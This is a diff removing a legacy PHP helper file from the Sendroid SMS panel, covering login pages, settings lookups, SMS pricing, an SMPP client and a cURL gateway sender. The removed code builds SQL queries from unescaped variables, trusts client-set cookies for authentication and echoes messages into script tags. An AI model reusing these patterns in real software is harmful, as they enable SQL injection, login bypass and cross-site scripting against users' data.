@@ -1,6971 +1,103 @@
-Ôªø<head>
-<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
-<meta http-equiv="Content-Language" content="ar-eg">
-</head>
-
-<?php defined('SMSPanel') or die('Snooping around is not allowed. Please use the front door');
-
-$version_id = $sconfig['verssion_id'];
-
-/*
-
-File name: 		index.inc
-
-Description:	This is main fuction that does allmost every stuff around here
-
-Developer: 		Chuka Okoye (Mr. White)
-
-Date: 			11/01/201
-
-*/
-
-set_time_limit(0);
-
-
-
-
-function getUserIP() {
-	if (!empty($_SERVER["HTTP_CLIENT_IP"]))
-
-	{
-
-	 $ip = $_SERVER["HTTP_CLIENT_IP"];
-
-	}
-
-	elseif (!empty($_SERVER["HTTP_X_FORWARDED_FOR"]))
-
-	{
-
-	 $ip = $_SERVER["HTTP_X_FORWARDED_FOR"];
-
-	}
-
-	else
-
-	{
-
-	 $ip = $_SERVER["REMOTE_ADDR"];
-
-	}
-
-return $ip;	
-
-}
-
-function isLogedIn() {
-
-	//check if admin
-
-	  if (isset($_COOKIE['verify-SMSPanel-Admin']) && isset($_SESSION['manageUser'])) {
-
-		  return true;
-
-	  } else {
-
-	  	if (!isset($_COOKIE['verify-SMSPanel']) || !isset($_COOKIE['CP-SMSPanel']) || empty($_COOKIE['CP-SMSPanel']))
-
-	  	 { return false; } else { return true; }
-
-	  }
-
-}
-
-function adminLogedIn() {
-
-  if (!isset($_COOKIE['verify-SMSPanel-Admin']) || !isset($_COOKIE['CP-SMSPanel-Admin']) || empty($_COOKIE['CP-SMSPanel-Admin']))
-
-   { return false; } else { return true; }
-
-}
-
-function getUser() {
-
-	if (isset($_COOKIE['verify-SMSPanel-Admin']) && isset($_SESSION['manageUser'])) {
-
-		return $_SESSION['manageUser'];
-
-	} else {
-
-		return @$_COOKIE['CP-SMSPanel']; 
-
-	}
-
-}
-
-function getAdmin() {
-
-return @$_COOKIE['CP-SMSPanel-Admin']; 
-
-}
-
-function showMessage($message, $class) {
-
-	if(empty($class) || is_numeric($class)) {
-
-		$class='blue';	
-
-	}
-
-	echo '<div id="messageBox" style="max-width: 600px;" class="message '.$class.'">'.$message.'<a href="javascript:{}" title="Dismiss" id="close-message" onClick="document.getElementById(\'messageBox\').style.display=\'none\';">x</a></div><br/>';	
-
-	
-
-	echo '<script>';
-
-	echo "Alert.render('".$message."')";
-
-	echo '</script>';		
-
-}
-
-if(!function_exists('showLoginPasswordProtect')) {
-
-	function showLoginPasswordProtect($message, $class,$reseller=0) {
-
-
-	//load defaults 
-	$siteName = getSetting('siteName');
-	$logo = $siteLogo = getSetting('siteLogo');
-	
-	if($reseller > 0) {
-		$siteName = getResellerSetting('business_name',$reseller);
-		$logo = getResellerSetting('logo_url',$reseller);
-		$siteLogo = 'media/uploads/'.getResellerSetting('logo_url',$reseller);
-	}	
-	if(empty($siteName)): $siteName = 'Sendroid v1.0'; endif;
-	if(empty($logo)){ $siteLogo = 'media/images/logo.png'; } else {
-		$siteLogo = BASE.'media/uploads/'.$siteLogo;
-	}	
-
-?>
-
-    	<div id="mess">
-
-            <?php if(!empty($message)) { showMessage($message, $class); } ?>
-
-        </div>        
-
-   <div id="login-center">
-
-            <div id="login-head">&nbsp;<span lang="ar-eg">ÿßŸÑÿØÿÆŸàŸÑ ŸàÿßŸÑÿ™ÿ≥ÿ¨ŸäŸÑ</span></div>
-			<div id="login-form">
-            
-			<p><img src="<?php echo $siteLogo; ?>" alt="<?php echo $siteName; ?>" title="<?php echo $siteName; ?>" /></p>
-
-            <form method="post" action="" name="login">
-
-                <p><input type="text" name="access_login" placeholder=" ÿ£ÿ≥ŸÖ ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ ÿßŸÑÿÆÿßÿµ ÿ®ŸÉ"></p>
-
-                <p><input type="password" name="access_password" placeholder="ŸÉŸÑŸÖŸá ÿßŸÑŸÖÿ±Ÿàÿ± ÿßŸÑÿÆÿßÿµ ÿ®ŸÉ"></p>
-
-                <p><button type="submit" id="login-submit" onClick="document.getElementById('login-loading').style.visibility='visible'; return true;" >ÿ™ÿ≥ÿ¨ŸäŸÑ ÿßŸÑÿØÿÆŸàŸÑ ÿßŸÑÿ¢ŸÜ</button></p>
-
-            </form>
-
-            <p><a href="<?php echo BASE; ?>index.php?register&p"><button>ÿßŸÑÿ™ÿ≥ÿ¨ŸäŸÑ</button></a></p>
-
-            <p><a href="<?php echo BASE; ?>index.php?reset&p" class="link">ÿßÿ≥ÿ™ÿ±ÿ¨ÿßÿπ ŸÉŸÑŸÖŸá ÿßŸÑŸÖÿ±Ÿàÿ±</a></p>
-
-			<div id="login-loading"><img src="<?php echo BASE; ?>media/images/spin.gif" /> ÿ¨ÿßÿ±Ÿä ÿßŸÑÿ™ÿ≠ŸÇŸÇ .....</div>
-
-        </div>
-        
-    </div> 
-
-	
-
-  </body>
-
-</html>	
-
- <?php 
-
- 	die();
-
- //end sho login	
-
-	}
-
-}
-
-
-
-if(!function_exists('showAdminLoginPasswordProtect')) {
-
-	function showAdminLoginPasswordProtect($message, $class) {
-
-
-
-	//load defaults 
-
-	$siteName = getSetting('siteName');
-	$siteLogo = getSetting('siteLogo');
-
-	 $siteName = 'Sendroid SMS Portal v1.0'; 
-
-	 $siteLogo = 'media/images/logo.png'; 
-
-?>
-
-    	<div id="mess">
-
-            <?php if(!empty($message)) { showMessage($message, $class); } ?>
-
-        </div>        
-
-   <div id="login-center">
-
-            <div id="login-head">&nbsp; <i class="fa fa-sign-in"></i> Admin login</div>
-
-			<div id="login-form">
-			<p><img src="<?php echo BASE.$siteLogo; ?>" alt="<?php echo $siteName; ?>" /></p>
-
-            <form method="post" action="" name="login">
-
-                <p><input type="text" name="access_login" placeholder=" ÿ£ÿ≥ŸÖ ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ ÿßŸÑÿÆÿßÿµ ÿ®ŸÉ"></p>
-
-                <p><input type="password" name="access_password" placeholder="ŸÉŸÑŸÖŸá ÿßŸÑŸÖÿ±Ÿàÿ± ÿßŸÑÿÆÿßÿµ ÿ®ŸÉ"></p>
-
-                <p><button type="submit" id="login-submit" onClick="document.getElementById('login-loading').style.visibility='visible'; return true;" >ÿ™ÿ≥ÿ¨ŸäŸÑ ÿßŸÑÿØÿÆŸàŸÑ ÿßŸÑÿ¢ŸÜ</button></p>
-
-            </form>
-
-            <p><a href="<?php echo BASE; ?>administrator/index.php?reset&p" class="link">ÿßÿ≥ÿ™ÿ±ÿ¨ÿßÿπ ŸÉŸÑŸÖŸá ÿßŸÑŸÖÿ±Ÿàÿ±</a></p>
-
-			<div id="login-loading"><img src="<?php echo BASE; ?>media/images/spin.gif" /> ÿ¨ÿßÿ±Ÿä ÿßŸÑÿ™ÿ≠ŸÇŸÇ .....</div>
-
-        </div>
-
-    </div> 
-
-	
-
-  </body>
-
-</html>	
-
- <?php 
-
- 	die();
-
- //end sho login	
-
-	}
-
-}
-
-
-
-
-
-if(!function_exists('ShowProcceed')) {
-
-	function ShowProcceed($message, $class) {
-
-?>
-
-    	<div id="mess" style="width: 100%;">
-
-            <?php if(!empty($message)) { showMessage($message, $class); } ?>
-
-        </div>        
-
-		
-
-        <p style="text-align:center;"><a href="<?php echo BASE; ?>index.php"><button class="submit" style="float:none; margin-top: 140px; width: 200px; height: 50px; font-size: 18px;">Continue</button></a></p>
-
-	
-
-  </body>
-
-</html>	
-
- <?php 
-
- 	die();
-
-	}
-
-}
-
-
-
-
-
-
-
-function setBackground() {
-
-	$query="SELECT * FROM settings WHERE field = 'siteBackground'"; 
-
-	$result = mysql_query($query) or die(mysql_error());  
-
-	$row = mysql_fetch_assoc($result); 
-
-	$imageURL = $row['value'];	
-
-	if(empty($imageURL)) {
-
-	return false;
-
-	} else {
-
-	return $imageURL;
-
-	}
-
-}
-
-function setGateway($id,$value) {
-
-	$query="SELECT * FROM gateways WHERE id = '$id'"; 
-
-	$result = mysql_query($query) or die(mysql_error());  
-
-	$row = mysql_fetch_assoc($result); 
-
-	$value = $row[$value];	
-
-	if(empty($value)) {
-
-	return '';
-
-	} else {
-
-	return $value;
-
-	}
-
-}
-
-function setBackgroundColor() {
-
-	$query="SELECT * FROM settings WHERE field = 'backgroundColor'"; 
-
-	$result = mysql_query($query) or die(mysql_error());  
-
-	$row = mysql_fetch_assoc($result); 
-
-	$color = $row['value'];	
-
-	if(empty($color)) {
-
-	return false;
-
-	} else {
-
-	return $color;
-
-	}
-
-}
-
-function setHeaderColor() {
-
-	$query="SELECT * FROM settings WHERE field = 'headerColor'"; 
-
-	$result = mysql_query($query) or die(mysql_error());  
-
-	$row = mysql_fetch_assoc($result); 
-
-	$color = $row['value'];	
-
-	if(empty($color)) {
-
-	return false;
-
-	} else {
-
-	return $color;
-
-	}
-
-}
-
-function setFooterColor() {
-
-	$query="SELECT * FROM settings WHERE field = 'footerColor'"; 
-
-	$result = mysql_query($query) or die(mysql_error());  
-
-	$row = mysql_fetch_assoc($result); 
-
-	$color = $row['value'];	
-
-	if(empty($color)) {
-
-	return false;
-
-	} else {
-
-	return $color;
-
-	}
-
-}
-
-function isReseller($id) {
-
-	$query="SELECT * FROM customers WHERE id = '$id'"; 
-
-	$result = mysql_query($query) or die(mysql_error());  
-
-	$row = mysql_fetch_assoc($result); 
-
-	$isReseller = $row['isReseller'];	
-
-	if($isReseller < 1) {
-
-	return false;
-
-	} else {
-
-	return true;
-
-	}
-
-}
-
-
-
-function checkEmailAddress($email) {
-
-    // First, we check that there's one @ symbol, and that the lengths are right
-
-    if (!ereg("^[^@]{1,64}@[^@]{1,255}$", $email)) {
-
-        // Email invalid because wrong number of characters in one section, or wrong number of @ symbols.
-
-        return false;
-
-    }
-
-    // Split it into sections to make life easier
-
-    $email_array = explode("@", $email);
-
-    $local_array = explode(".", $email_array[0]);
-
-    for ($i = 0; $i < sizeof($local_array); $i++) {
-
-         if (!ereg("^(([A-Za-z0-9!#$%&'*+/=?^_`{|}~-][A-Za-z0-9!#$%&'*+/=?^_`{|}~\.-]{0,63})|(\"[^(\\|\")]{0,62}\"))$", $local_array[$i])) {
-
-            return false;
-
-        }
-
-    }    
-
-    if (!ereg("^\[?[0-9\.]+\]?$", $email_array[1])) { // Check if domain is IP. If not, it should be valid domain name
-
-        $domain_array = explode(".", $email_array[1]);
-
-        if (sizeof($domain_array) < 2) {
-
-                return false; // Not enough parts to domain
-
-        }
-
-        for ($i = 0; $i < sizeof($domain_array); $i++) {
-
-            if (!ereg("^(([A-Za-z0-9][A-Za-z0-9-]{0,61}[A-Za-z0-9])|([A-Za-z0-9]+))$", $domain_array[$i])) {
-
-                return false;
-
-            }
-
-        }
-
-    }
-
-    return true;
-
-}
-
-
-
-function transactionStatus($id) {
-
-	$query="SELECT * FROM transaction_status WHERE id = '$id'"; 
-
-	$result = mysql_query($query) ; 
-
-	$row = mysql_fetch_assoc($result); 
-
-	$value = $row['value'];	
-
-	return $value;
-
-}
-
-
-
-function getName($id) {
-
-	$query="SELECT * FROM customers WHERE id = '$id'"; 
-
-	$result = mysql_query($query) or die(mysql_error());  
-
-	$row = mysql_fetch_assoc($result); 
-
-	$value = $row['name'];	
-
-	return $value;
-
-}
-
-function getAdminName($id) {
-
-	$query="SELECT * FROM users WHERE id = '$id'"; 
-
-	$result = mysql_query($query) or die(mysql_error());  
-
-	$row = mysql_fetch_assoc($result); 
-
-	$value = $row['firstName'].' '.$row['lastName'];	
-
-	return $value;
-
-}
-
-function getAdminKey($id) {
-
-	$query="SELECT * FROM users WHERE id = '$id'"; 
-
-	$result = mysql_query($query) or die(mysql_error());  
-
-	$row = mysql_fetch_assoc($result); 
-
-	$value = $row['password'];	
-
-	return $value;
-
-}
-
-function getUsername($id) {
-
-	$query="SELECT * FROM customers WHERE id = '$id'"; 
-
-	$result = mysql_query($query) or die(mysql_error());  
-
-	$row = mysql_fetch_assoc($result); 
-
-	$value = $row['username'];	
-
-	if($id < 1) {
-
-		$value	= 'Administrator';
-
-	}	
-
-	return $value;
-
-}
-
-function getAdminUsername($id) {
-
-	$query="SELECT * FROM users WHERE id = '$id'"; 
-
-	$result = mysql_query($query) or die(mysql_error());  
-
-	$row = mysql_fetch_assoc($result); 
-
-	$value = $row['username'];	
-
-	return $value;
-
-}
-
-function transactionAmount($id) {
-
-	$query="SELECT * FROM transactions WHERE id = '$id'"; 
-
-	$result = mysql_query($query) or die(mysql_error());  
-
-	$row = mysql_fetch_assoc($result); 
-
-	$value = $row['cost'];	
-
-	return $value;
-
-}
-
-function transactionGateway($id) {
-
-	$query="SELECT * FROM transactions WHERE id = '$id'"; 
-
-	$result = mysql_query($query) or die(mysql_error());  
-
-	$row = mysql_fetch_assoc($result); 
-
-	$gateway = $row['gateway'];	
-
-	$result = mysql_query("SELECT * FROM paymentgateways WHERE id='$gateway'"); 
-
-	$row = mysql_fetch_assoc($result);
-
-	$value = $row['name'];	
-
-	return $value;
-
-}
-
-function userData($field, $id) {
-
-	$query="SELECT * FROM customers WHERE id = '$id'"; 
-
-	$result = mysql_query($query) or die(mysql_error());  
-
-	$row = mysql_fetch_assoc($result); 
-
-	$value = $row[ $field ];	
-
-	if(empty($value)) {
-
-	return 'not available';
-
-	} else {
-
-	return $value;
-
-	}
-
-}
-
-function adminData($field, $id) {
-
-	$query="SELECT * FROM users WHERE id = '$id'"; 
-
-	$result = mysql_query($query) or die(mysql_error());  
-
-	$row = mysql_fetch_assoc($result); 
-
-	$value = $row[ $field ];	
-
-	if(empty($value)) {
-
-	return 'not available';
-
-	} else {
-
-	return $value;
-
-	}
-
-}
-
-function shorten($intro, $len) { 
-
-	$string = strip_tags($intro);
-
-	if (strlen($string) > $len) 
-
-	{
-
-    // truncate string
-
-    $stringCut = substr($string, 0, $len);
-
-    // make sure it ends in a word so assassinate doesn't become ass...
-
-    $string = substr($stringCut, 0, strrpos($stringCut, ' ')).'... '; 
-
-	}
-
-	
-
-	return $string;
-
-}
-
-
-
-//sms functions 
-
-function correctCommas($csv) {
-
-	$inpt= array("\r","\n",' ',';',':','"','.',"'",'`','\t','(',')','<','>','{','}','#',"\r\n",'-','_','?','+');
-
-	$oupt= array(',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',',');
-
-	$csv = str_replace($inpt,$oupt,$csv);
-
-	while(strripos($csv,',,') !== false){
-
-		$csv = str_replace(',,',',',$csv);
-
-	}
-
-	while(strripos($csv,'\r') !== false){
-
-		$csv = str_replace('\r',',',$csv);
-
-	}
-
-	while(strripos($csv,'\n') !== false){
-
-		$csv = str_replace('\n',',',$csv);
-
-	}
-
-	$csv = str_replace($inpt,$oupt,$csv);
-
-	return $csv;
-
-}
-
-
-
-function alterPhone($gsm,$code) {
-
-	$array = is_array($gsm);
-
-	$gsm = ($array) ? $gsm : explode(",",$gsm);
-
-	$homeCountry = $code;
-
-	$outArray = array();
-
-	foreach($gsm as $item)
-
-	{
-
-		if(!empty($item)){
-
-			$item1 = (string)$item;
-
-			$q = substr($item1,0,1);
-
-			$w = substr($item1,0,3);
-
-			$item1 = (substr($item1,0,1) == "+") ? substr($item1,1) : $item1;
-
-			$item1 = (substr($item1,0,3) == "009") ? $homeCountry.substr($item1,3): $item1;
-
-			$item1 = (substr($item1,0,1) == "0") ? $homeCountry.substr($item1,1): $item1;
-
-			$item1 = (substr($item1,0,strlen($homeCountry)) == $homeCountry) ? $homeCountry.substr($item1,strlen($homeCountry)): $item1;
-
-			$outArray[] = $item1;
-
-		}
-
-	}
-
-	return ($array) ? $outArray : implode(",",$outArray);
-
-}
-
-function removeDuplicate($myArray) {
-
-	$array = is_array($myArray);
-
-	$myArray = ($array) ? $myArray: explode(",",$myArray);
-
-	$myArray = array_flip(array_flip(array_reverse($myArray,true)));
-
-	return ($array) ? $myArray : implode(',',$myArray);
-
-}
-
-function mceil($number) {
-	$array = explode(".",$number);
-	$deci = ((int)$array[1] > 0) ? 1 : 0;
-	return (int)$array[0] + $deci;
-}
-
-function getMessageLink($table,$id) {
-	$result = mysql_query("SELECT * FROM $table WHERE id = '$id' LIMIT 1") or die(mysql_error());	
-	$row = mysql_fetch_assoc($result);
-	$return = 'Compose.php';
-	if($row['is_mms'] > 0) {
-		$return = 'MMS.php';
-	}
-	if($row['is_unicode'] > 0) {
-		$return = 'Unicode.php';
-	}
-return $return;	
-}
-
-function  smsCost($recipientList,$textMessage,$customer=0) {
-	//get message lenght 
-	$requiredCredit = 0;
-	$messageLenght = strlen($textMessage);
-	$smsLength = "160";
-	if(strlen($textMessage) > 160){
-		$smsLength = 145;
-	}
-
-	//get price based on destination country
-	$pricelist =  getSetting('smsCost');
-	if($customer > 0) {
-		$pricelist  = userData('custom_rate',$customer);
-	}
-	$searchKeys = array("\r\n","<br>","\n","\r");
-	$replaceKeys = array(",",",",",",",");
-	$pricelist = str_replace( $searchKeys , $replaceKeys , $pricelist);
-	$pricelist = explode(',',$pricelist);
-	$countryPrices = array();
-	for($i=0; $i<count($pricelist); $i++) { 
-		$countryPrices[] = explode('=',$pricelist[$i]);
-	}
-	
-	$priceList = $countryPrices; 
-	
-	$credit = array();
-	$credito = 0;
-    $recipientList = explode(",", $recipientList);
-	
-	for($i=0; $i < count($recipientList); $i++){			
-		//get the sms unit to use for each number
-		$unitcost=getSetting('defaultCost');
-		for($j=0; $j < count($priceList); $j++){
-			$len = strlen($priceList[$j][0]); 
-							
-			if(substr($recipientList[$i],0,$len) == $priceList[$j][0] && $len > 0 && !empty($priceList[$j][0])){
-				$unitcost=$priceList[$j][1]; 
-				break;
-			}
-		} 
-	
-						
-		$requiredCredit2 = ($messageLenght <= $smsLength) ? mceil($messageLenght/$smsLength)*$unitcost : mceil($messageLenght/$smsLength)*$unitcost ;   
-		$requiredCredit = $requiredCredit + $requiredCredit2;
-	} //end for si
-	return $requiredCredit;
-}
-
-
-
-function  smsUnicodeCost($recipientList,$textMessage,$customer=0) {
-	//get message lenght 
-	$requiredCredit = 0;
-	$messageLenght = strlen($textMessage);
-	$smsLength = "70";
-
-	//get price based on destination country
-	$pricelist =  getSetting('smsCost');
-	if($customer > 0) {
-		$pricelist  = userData('custom_rate',$customer);
-	}
-	$searchKeys = array("\r\n","<br>","\n","\r");
-	$replaceKeys = array(",",",",",",",");
-	$pricelist = str_replace( $searchKeys , $replaceKeys , $pricelist);
-	$pricelist = explode(',',$pricelist);
-	$countryPrices = array();
-	for($i=0; $i<count($pricelist); $i++) { 
-		$countryPrices[] = explode('=',$pricelist[$i]);
-	}
-	
-	$priceList = $countryPrices; 
-	
-	$credit = array();
-	$credito = 0;
-    $recipientList = explode(",", $recipientList);
-	
-	for($i=0; $i < count($recipientList); $i++){			
-		//get the sms unit to use for each number
-		$unitcost=getSetting('defaultCost');
-		for($j=0; $j < count($priceList); $j++){
-			$len = strlen($priceList[$j][0]); 
-							
-			if(substr($recipientList[$i],0,$len) == $priceList[$j][0] && $len > 0 && !empty($priceList[$j][0])){
-				$unitcost=$priceList[$j][1]; 
-				break;
-			}
-		} 
-	
-						
-		$requiredCredit2 = ($messageLenght <= $smsLength) ? mceil($messageLenght/$smsLength)*$unitcost : mceil($messageLenght/$smsLength)*$unitcost ;   
-		$requiredCredit = $requiredCredit + $requiredCredit2;
-	} //end for si
-	return $requiredCredit;
-}
-
-
-
-function countMessageRecipient($id) {
-
-	$sql = "SELECT sum((LENGTH(recipient)+1) - LENGTH(REPLACE(recipient, ',', ''))) as value1 FROM sentmessages WHERE id = '$id'";
-
-	$result = mysql_query($sql) or die(mysql_error());
-
-	$row = mysql_fetch_assoc($result);
-
-	return $num = round($row['value1']);		
-
-}
-
-function utf8_to_unicode($str) {
-	$unicode = array();
-	$values = array();
-	$lookingFor = 1;
-
-	for ($i = 0; $i < strlen($str); $i++) {	
-		$thisValue = ord($str[$i]);
-		
-		if ($thisValue < 128)			
-			$unicode[] = str_pad(dechex($thisValue), 4, "0", STR_PAD_LEFT);
-		else {
-			if (count($values) == 0) $lookingFor = ($thisValue < 224) ? 2 : 3;
-				$values[] = $thisValue;
-			if (count($values) == $lookingFor) {
-				$number = ($lookingFor == 3) ?
-				(($values[0] % 16) * 4096) + (($values[1] % 64) * 64) + ($values[2] % 64):
-				(($values[0] % 32) * 64) + ($values[1] % 64);
-				$number = strtoupper(dechex($number));		
-				$unicode[] = str_pad($number, 4, "0", STR_PAD_LEFT);
-				$values = array();
-				$lookingFor = 1;
-			} 
-		} 
-	} return ($unicode);
-}
-
-function isValidURL($url) {
-	if (filter_var($url, FILTER_VALIDATE_URL) === FALSE) {
-		return false;
-	} else {
-		return true;	
-	}
-}
-
-function getInsertedID($table) {
-		$result = mysql_query("SELECT * FROM $table ORDER BY id DESC LIMIT 1"); 
-		$row = mysql_fetch_assoc($result);
-		$id = $row['id'];	
-	return $id;	
-}
-
-class smpp {
-
-  var $socket=0;
-  var $seq=0;
-  var $debug=0;
-  var $data_coding=0;
-  var $timeout = 30;
-
-  //////////////////////////////////////////////////
-  function send_pdu($id,$data) {
-
-    // increment sequence
-    $this->seq +=1;
-    // PDU = PDU_header + PDU_content
-    $pdu = pack('NNNN', strlen($data)+16, $id, 0, $this->seq) . $data;
-    // send PDU
-    fputs($this->socket, $pdu);
-
-    // Get response length
-    $data = fread($this->socket, 4);
-    if($data==false) die("\nSend PDU: Connection closed!");
-    $tmp = unpack('Nlength', $data);
-    $command_length = $tmp['length'];
-    if($command_length<12) return;
-
-    // Get response 
-    $data = fread($this->socket, $command_length-4);
-    $pdu = unpack('Nid/Nstatus/Nseq', $data);
-    if($this->debug) print "\n< R PDU (id,status,seq): " .join(" ",$pdu) ;
-
-    return $pdu;
-  }
-
-  //////////////////////////////////////////////////
-  function open($host,$port,$system_id,$password) {
-
-    // Open the socket
-    $this->socket = fsockopen($host, $port, $errno, $errstr, $this->timeout);
-    if ($this->socket===false)
-       die("$errstr ($errno)<br />");
-    if (function_exists('stream_set_timeout'))
-       stream_set_timeout($this->socket, $this->timeout); // function exists for php4.3+
-    if($this->debug) print "\n> Connected" ;
-
-
-    // Send Bind operation
-    $data  = sprintf("%s\0%s\0", $system_id, $password); // system_id, password 
-    $data .= sprintf("%s\0%c", "", 0x34);  // system_type, interface_version
-    $data .= sprintf("%c%c%s\0", 5, 0, ""); // addr_ton, addr_npi, address_range 
-
-    $ret = $this->send_pdu(2, $data);
-    if($this->debug) print "\n> Bind done!" ;
-
-    return ($ret['status']==0);
-  }
-
-  //////////////////////////////////////////////////
-  function submit_sm($source_addr,$destintation_addr,$short_message,$optional='') {
-
-    $data  = sprintf("%s\0", ""); // service_type
-    $data .= sprintf("%c%c%s\0", 5,0,$source_addr); // source_addr_ton, source_addr_npi, source_addr
-    $data .= sprintf("%c%c%s\0", 1,1,$destintation_addr); // dest_addr_ton, dest_addr_npi, destintation_addr
-    $data .= sprintf("%c%c%c", 0,0,0); // esm_class, protocol_id, priority_flag
-    $data .= sprintf("%s\0%s\0", "",""); // schedule_delivery_time, validity_period
-    $data .= sprintf("%c%c", 0,0); // registered_delivery, replace_if_present_flag
-    $data .= sprintf("%c%c", $this->data_coding,0); // data_coding, sm_default_msg_id
-    $data .= sprintf("%c%s", strlen($short_message), $short_message); // sm_length, short_message
-    $data .= $optional;
-
-    $ret = $this->send_pdu(4, $data);
-    return ($ret['status']==0);
-  }
-
-  //////////////////////////////////////////////////
-  function close() {
-
-    $ret = $this->send_pdu(6, "");
-    fclose($this->socket);
-    return true;
-  }
-
-  //////////////////////////////////////////////////
-  function send_long($source_addr,$destintation_addr,$short_message,$utf=0,$flash=0) {
-
-    if($utf)
-      $this->data_coding=0x08;
-
-    if($flash)
-      $this->data_coding=$this->data_coding | 0x10;
-
-    $size = strlen($short_message);
-    if($utf) $size+=20;
-	
-		if ($size<160) { // Only one part :)
-		  $this->submit_sm($source_addr,$destintation_addr,$short_message);
-	
-		} else { // Multipart
-		  $sar_msg_ref_num =  rand(1,255);
-		  $sar_total_segments = ceil(strlen($short_message)/130);
-	
-		  for($sar_segment_seqnum=1; $sar_segment_seqnum<=$sar_total_segments; $sar_segment_seqnum++) {
-			$part = substr($short_message, 0 ,130);
-			$short_message = substr($short_message, 130);
-	
-			$optional  = pack('nnn', 0x020C, 2, $sar_msg_ref_num);
-			$optional .= pack('nnc', 0x020E, 1, $sar_total_segments);
-			$optional .= pack('nnc', 0x020F, 1, $sar_segment_seqnum);
-	
-			if ($this->submit_sm($source_addr,$destintation_addr,$part,$optional)===false)
-			   return false;			
-		  }
-    }
-   return true;
-  }
-}
-
-
-function sendMessage($senderID,$recipientList,$textMessage,$customer,$sentFrom,$IP='',$unicode=0,$mms=0,$media=0,$saved=0) {
-$error = 0;
-	//check for MMS
-	if($mms > 0 && getSetting('MMSEnabled') < 1) {
-		$error = 1;
-		$return = 'Unable to send message! MMS feature is not supported';
-	}
-	
-	//check for unicode
-	if($unicode > 0 && getSetting('unicodeSMS') < 1) {
-		$error = 1;
-		$return = 'Unable to send message! UNICODE feature is not supported';
-	}
-	
-	//check for valid media URL
-	if($mms > 0 && !isValidURL($media)) {
-		$error = 1;
-		$return = 'Unable to send message! Multimedia URL Format is not valid. Use a valid URL';
-	}
-		//get gateway settings 
-	$recipientList = $nn = preg_replace("/[^0-9+,]/", "", $recipientList );
-	$recipientList = implode(',',array_unique(explode(',', $recipientList)));
-	$senderID2 = $senderID;
-	$activeGateway = getSetting('activeGateway');
-	if($unicode > 0) {
-		$activeGateway = getSetting('activeUnicodeGateway');
-	}	
-	if($mms > 0) {
-		$activeGateway = getSetting('activeMMSGateway');
-	}
-	
-	$sendURL = setGateway($activeGateway,'sendAPI');
-	if($unicode > 0) {
-		$sendURL = setGateway($activeGateway,'unicodeAPI');	
-	}	
-	if($mms > 0) {
-		$sendURL = setGateway($activeGateway,'mmsAPI');
-	}
-	if(empty($sendURL)) {
-		$error = 1;
-		$return = 'Unable to send message! No gateway API provided for this message type';
-	}
-	$batchSize = setGateway($activeGateway,'batchSize');
-	$successWord = setGateway($activeGateway,'successWord');
-	$smppServer = setGateway($activeGateway,'smppServer');
-	$smppUsername = setGateway($activeGateway,'smppUsername');
-	$smppPassword = setGateway($activeGateway,'smppPassword');
-		
-if($error < 1) {	
-
-	
-	if(setGateway($activeGateway,'isSMPP') > 0 && !empty($smppServer) && !empty($smppUsername) && !empty($smppPassword) ) { //use SMPP
-		$s = new smpp();
-		$s->debug=0;	
-		$s->open($smppServer, 2775, $smppUsername, $smppPassword);
-		if($unicode == 0) {
-			$s->send_long($senderID, $recipientList, $message);
-		} else {
-			$utf = true;
-			$message = iconv('Windows-1256','UTF-16BE',$message);
-			$s->send_long($senderID, $recipientList, $message,$utf);
-		}	
-		$s->close();
-		$response = $successWord;
-	} else {		//use cURL
-		$sendURL = setGateway($activeGateway,'sendAPI');
-		if($unicode > 0) {
-			$sendURL = setGateway($activeGateway,'unicodeAPI');	
-		}	
-		if($mms > 0) {
-			$sendURL = setGateway($activeGateway,'mmsAPI');
-			$sendURL = str_replace('[MEDIA]', urlencode($media), $sendURL);	
-		}
-		
-		$sendURL = str_replace('[SENDER]', urlencode($senderID), $sendURL);
-		$sendURL = str_replace('[TO]', urlencode($recipientList), $sendURL);
-		$sendURL = str_replace('[MESSAGE]', urlencode($textMessage), $sendURL);
-		if($unicode > 0) { //cpnver to unicode
-			$textMessage2 = utf8_to_unicode($textMessage);
-			$textMessage2 = implode("", $textMessage2);		
-			$sendURL = str_replace('[MESSAGE]', urlencode($textMessage2), $sendURL);
-		}
-		$url = $sendURL;
-		$gatewayAuth = setGateway($activeGateway,'auth_key');
-		
-		$ch = curl_init();	
-		curl_setopt($ch, CURLOPT_URL,$url);
-		curl_setopt($ch, CURLOPT_HTTPHEADER,array("Expect:"));
-		if(!empty($gatewayAuth)) { //gateway needs authentication
-			$auth = setGateway($activeGateway,'auth_key');
-			curl_setopt($ch, CURLOPT_USERPWD, $auth );
-		}
-		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);	
-		$response = curl_exec($ch);
-		curl_close($ch);	
-	}
-		$status = 'Failed';	
-		if(!$response) {
-			$return = 'Connection to Gateway Failed. Please try again later';  //. curl_error($ch)
-		  } else {
-			 $return = 'Message Sending Failed. Unknown Gateway Error';
-				if((stripos($response,$successWord) !== false)) {
-				   $return = 'Message Sent Successfully';
-				   $status = 'Sent';
-			   } else {
-				  $return = 'Message sending was interrupted. Please report error to your admin. ERROR: '.$response;
-			   }
-		  }  
-}
-
-$error = mysql_real_escape_string($return);
-mysql_query("UPDATE `messagedetails` SET `status` = '$status' WHERE `id` = '$id'") or die(mysql_error());
-mysql_query("UPDATE `messagedetails` SET `error` = '$error' WHERE `id` = '$id'") or die(mysql_error());
-
-//save messsage if necessary
-	if($saved < 1){	  
-		$messageLenght = strlen($textMessage);
-		$messageLenght = mceil($messageLenght/160);
-		$unitsUsed = smsCost($recipientList,$textMessage,$customer);
-		if($unicode > 1) {
-			$messageLenght = mceil($messageLenght/70);
-			$unitsUsed = smsUnicodeCost($recipientList,$textMessage,$customer);			
-		}
-		if($status == 'Failed') {
-			$unitsUsed = 0;
-		}
-		//add to sent items as failed
-		$now = date("Y-m-d H:i:s");
-	$reseller = userData('reseller',$customer);	
-	if(empty($reseller)) {
-		$reseller = 0;	
-	}
-		$add = mysql_query("INSERT INTO sentmessages (`id`, `message`, `senderID`, `recipient`, `date`, `customer`, `pages`, `status`, `units`, `sentFrom`, `IP`, `error`,`reseller`) 
-		VALUES (NULL, '$textMessage', '$senderID', '$recipientList', '$now', '$customer', '$messageLenght', '$status', '$unitsUsed', '$sentFrom', '$IP', '$error','$reseller');");		
-	} 
-	return $return; 
-}
-
-
-
-function sendQueuedMessage($id) {
-	//fetch message
-	$sql = "SELECT * FROM sentmessages WHERE id = '$id'";
